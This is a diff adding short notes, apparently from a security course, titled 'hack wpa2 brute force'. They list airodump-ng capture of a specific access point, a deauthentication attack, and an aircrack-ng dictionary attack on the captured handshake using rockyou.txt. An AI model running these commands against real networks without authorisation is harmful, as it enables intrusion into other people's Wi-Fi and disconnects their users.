@@ -1,0 +1,6 @@
+hack wpa2 brute force
+airodump-ng --band abg -c 1 --bssid 08:5A:11:C1:A9:CA wlo1mon -w wpa_hacking
+now do defauthentication attack for short period of time
+WPA handshake: 08:5A:11:C1:A9:CA
+aircrack-ng -w rockyou.txt /home/alihazimeh/Desktop/semsec-websecurity/wpa_hacking-01.cap
+
